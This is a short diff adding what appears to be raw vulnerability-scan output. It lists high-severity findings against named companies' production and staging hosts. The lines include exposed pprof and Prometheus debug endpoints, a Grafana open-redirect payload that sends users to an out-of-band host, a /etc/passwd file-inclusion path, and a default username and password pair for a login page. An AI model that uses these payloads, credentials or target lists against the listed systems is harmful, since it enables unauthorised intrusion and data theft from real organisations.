@@ -1,0 +1,10 @@
+[CVE-2019-11248] [http] [high] https://digitalocean-inference-us-atl1-prometheus.tunnel.fireworks.ai/debug/pprof/
+[CVE-2019-11248] [http] [high] https://infra-platform.mc-dev.baseten.co/debug/pprof/
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.sip-web.vapi.ai/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.sip-web2.vapi.ai/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.staging-sip-web1.vapi.ai/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-55184] [http] [high] https://exa.ai/search/xwrapped
+[CVE-2025-55184] [http] [high] https://fireworks.ai
+[apache-casbin-mcp-gateway-default-login] [http] [high] https://creators.n8n.io/login [password="password123",username="alice"]
+[generic-linux-lfi] [http] [high] https://staging-webrtc.vapi.ai/etc/passwd [paths="/etc/passwd"]
+[prometheus-unauth] [http] [high] https://digitalocean-inference-us-atl1-prometheus.tunnel.fireworks.ai/api/v1/status/config
